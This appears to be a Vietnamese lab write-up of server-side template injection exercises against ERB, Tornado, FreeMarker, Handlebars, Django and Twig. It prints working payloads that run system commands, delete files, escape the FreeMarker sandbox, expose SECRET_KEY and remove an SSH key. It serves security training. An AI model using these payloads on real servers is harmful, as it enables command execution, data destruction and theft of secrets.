## Lab: Basic server-side template injection

![image](https://hackmd.io/_uploads/rJKvtbScxx.png)

- Start:
- ERB template là của ruby , [chi tiết](https://docs.ruby-lang.org/en/2.3.0/ERB.html). ERB template bản chất nó chỉ là một công cụ cho phép bạn nhúng code Ruby vào trong một file text (thường là HTML).Khi render, phần code Ruby bên trong sẽ được thực thi, còn text bình thường thì giữ nguyên.
- để xóa được file **morale.txt** cần chạy được system command . 
- bắt reuqest : ![image](https://hackmd.io/_uploads/HJe9lzr5xe.png) . thấy rằng values of parameter message appear in response . 
- thay value of parameter message là  **<%= 3+3 %>**![image](https://hackmd.io/_uploads/r17_bGr9ex.png)thấy response trả về là 6 ==> lỗi 
- chạy lệnh system("ls") để xem cấu trúc ![image](https://hackmd.io/_uploads/SyP8MMB9gl.png)

**các cách cách chạy system command in ruby**: 
1. system("command")
2. Backtick: `command`
3. %x{command}
4. exec("command")
- payload : <%= system("rm morale.txt") %>
- lý do : sử dụng template động và chèn trực tiếp input user nào tenplate sau đó render mà không validate 
- ví dụ : `template = "Hello <%= name %>!"
renderer = ERB.new(template)
puts renderer.result(binding)`
## Lab: Basic server-side template injection (code context)

![image](https://hackmd.io/_uploads/rJhYLzr5ge.png)

- start:
- tornado template một template của python
- bắt request chọn tên hiển thị của author trên comment: ![image](https://hackmd.io/_uploads/HkRAJXB5el.png)

- sử dụng ${{<%[%'"}}%\ để test xem thì lấy lỗi trả về . "No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 4 _tt_tmp = ${{<%[%'" # <string>:1 ^ SyntaxError: invalid syntax" chứng tỏ phía backend có render mà nối chuỗi nên mới bị payload trên phá cấu trúc syntax của code

- payload : **{{7*'7'}}** thì lấy response trả về . **{{7777777}}**  . Nếu tôi truyền vào 8*'8' thì thấy response trả về 88888888 . Khả năng cao logic code chèn input user vào cặp {{}} 
- payload : user.first_name}}{% import os %}{{8*'8'}}{{os.system('ls') thấy chỉ có mỗi file morale.txt trong folder này .
payload : user.first_name}}{% import os %}{{8*'8'}}{{os.remove('morale.txt')
    
    
    
    
## Lab: Server-side template injection using documentation
    
![image](https://hackmd.io/_uploads/rycnGFI9ex.png)

- start:
- ở function edit template insert a parameter not exits to triger error.![image](https://hackmd.io/_uploads/Sy4HkTL5ge.png)
    thấy rằng lab sử dụng **FreeMarker Template**
- payload : **${7*7}** thấy response trả về 49
- payload : **${"freemarker.template.utility.Execute"?new()("rm morale.txt")}**
    Class freemarker.template.utility.Execute là một class có rẵn trong freemarker cho phép thực thi câu lệnh hệ thống (system command).
    ?new() tạo một instance of class 
    
    
    
## Lab: Server-side template injection in an unknown language with a documented exploit
    
![image](https://hackmd.io/_uploads/Syn2Qp89xl.png)

- start:
- ![image](https://hackmd.io/_uploads/SyJkBp89ll.png)
reflect values of parameter message in response
- payload : **${{<%[%'"}}%\** thấy có thông báo lỗi nhận thấy là Handlebars template engine của node.js
- search payload [ở đây](https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#handlebars) .
    
    
    
## Lab: Server-side template injection with information disclosure via user-supplied objects



    
    
 ![image](https://hackmd.io/_uploads/rkyULGP5xe.png)

    
- start:
    - sử dụng payload : ${{<%[%'"}}%\ xác nhận có lỗ hổng SSTI , nhận thấy lỗi trả về sử dụng Django template <chỉ có thể truyền vào tham số được built-in trong context>
    - để biết được context truyền vào trong template dùng payload : **{% debug %}** trả về context mà view truyền vào template <Nếu backend bật DEBUG=True> . Thấy response trả về full context
    - muốn biết được framework's secret key cần truy cập vào setting và payload trên cho ta thấy config setting của template 'settings': <LazySettings "None">}{'False': False, 'None': None, 'True': True} 
    - backend truyền object setting vào template thì có thể truy cập . 
    - payload : {{ settings.SECRET_KEY }}
    
    
    
## Lab: Server-side template injection in a sandboxed environment

![image](https://hackmd.io/_uploads/B18qM8O5ll.png)

- start:
    -Trigger lỗi thấy sử dụng freemarker template . payload :** ${3*3}** thấy response trả về 9 . 
    - payload : **${"freemarker.template.utility.Execute"?new()("id")}** thấy trả về **freemarker.template.utility.Execute is not allowed in the template for security reasons.**
    - payload : **${.version}** thấy version **2.3.29** . Đối với các version < 2.3.30 bị dính SSTI 
    - payload : **<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}** [đọc thêm](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack)
    với article là một custom object java backend nên cần phải thay bằng một object tồn tại trong context backend . 
- payload : **<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat yg5714fl2js29n7tr7md")}
**
    
    **ý tưởng payload :** từ một object java backend truy cập lên ClassLoader thông qua **.protectionDomain.classLoader** . Sau đó load các class nội bộ của FreeMarker ** *classLoader.loadClass(...)**

## Lab: Server-side template injection with a custom exploit
    
![image](https://hackmd.io/_uploads/B1JB1KOqxe.png)

- Start:
- payload : **${{<%[%'"}}%\** trigger lỗi nhận thấy sử dungj twig template(php)
- nếu gửi một avatar không phải định dạng image thì thấy thông báo lỗi để lộ method của class user **User->setAvatar('/tmp/Screenshot...', 'text')** . Nếu định dạng là image thì có relect nội dung của file trong ảnh . Method setAvartar('đường dẫn file' , 'định dạng ') 
- payload : **blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/png')** đọc nội dung của User.php. ![image](https://hackmd.io/_uploads/Sk0rrQt9xx.png)

lợi dụng function để **delete file /.ssh/id_rsa from Carlos's home directory.**Nhận thấy function rm() xóa dựa trên $filename mà attribute này được control bới user

- payload :  **blog-post-author-display=user.setAvatar('/home/carlos//.ssh/id_rsa','image/png')** sau đó nhập tiếp **user.gdprDelete()**
    



